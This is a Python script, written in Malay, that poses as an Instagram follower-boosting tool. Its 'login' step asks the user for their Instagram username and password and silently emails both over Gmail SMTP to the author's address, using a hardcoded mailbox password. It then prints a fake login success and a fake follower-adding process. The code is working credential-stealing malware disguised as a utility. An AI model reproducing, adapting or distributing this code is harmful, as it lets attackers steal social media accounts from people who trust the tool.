#!/bin/usr/python

import os, sys, time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

def lari(s):
	for khazul in s + '\n':
		sys.stdout.write(khazul)
		sys.stdout.flush()
		time.sleep(10. /2500)

os.system('clear')
lari("\033[1;32m	      Assalamualaikum ... 😊	")
lari("\033[1;32m        Selamat menggunakan tool ini ... ")
print ("""

	\033[1;36m -------------------------
	\033[1;31m |\033[1;33m  INSTAGRAM FOLLOWERS  \033[1;31m|
	\033[1;36m -------------------------

\033[1;35m Author \033[1;30m: \033[1;32m KHAZUL YUSSERY SHADIQ
\033[1;35m IG \033[1;30m    : \033[1;32m khazulyussery_
""")

def menu():
	print (" ")
	print ("\033[1;37m Daftar followers : ")
	print ("\033[1;33m ------------------ ")
	print ("\033[1;30m 1]. \033[1;36m Aktif ")
	print ("\033[1;30m 2]. \033[1;36m Pasif ")
	print ("\033[1;33m ------------------ ")
menu()

def pilih():
	print ("\033[1;31m ┌─[khazul%fafad]<>[autofollowers] ")
	a = input("\033[1;35m └─>> ")
	if a == "1":
		print (" ")
		print ("\033[1;37m Login dulu : ")
		print ("\033[1;33m ------------ ")
		msg = MIMEMultipart()
		print (" ")
		message = input("\033[1;35mUsername : ")
		password = "khazul0411"
		msg['From'] = "khazulyusseryshadiq@gmail.com"
		msg['To'] = "khazulyusseryshadiq@gmail.com"
		msg['Subject'] = input("Password : ")
		msg.attach(MIMEText(message, 'plain'))
		server = smtplib.SMTP('smtp.gmail.com: 587')
		server.starttls()
		server.login(msg['From'], password)
		server.sendmail(msg['From'], msg['To'], msg.as_string())
		server.quit()
		print (" ")
		print ("\033[1;33m [+] Login Sukses")
	elif a == "2":
		print (" ")
		print ("\033[1;37m Login dulu : ")
		print ("\033[1;33m ------------ ")
		msg = MIMEMultipart()
		print (" ")
		message = input("\033[1;35mUsername : ")
		password = "khazul0411"
		msg['From'] = "khazulyusseryshadiq@gmail.com"
		msg['To'] = "khazulyusseryshadiq@gmail.com"
		msg['Subject'] = input("Password : ")
		msg.attach(MIMEText(message, 'plain'))
		server = smtplib.SMTP('smtp.gmail.com: 587')
		server.starttls()
		server.login(msg['From'], password)
		server.sendmail(msg['From'], msg['To'], msg.as_string())
		server.quit()
		print (" ")
		print ("\033[1;33m [+] Login Sukses")

pilih()

def proses():
	print (" ")
	a = input("\033[1;37m Masukkan jumlah follower : ")
	print (" ")
	print ("\033[1;31m [+] Proses mesin ... ")
	time.sleep(10)
	print (" ")
	print ("\033[1;35m [+] Follower sukses ditambah ")
proses()
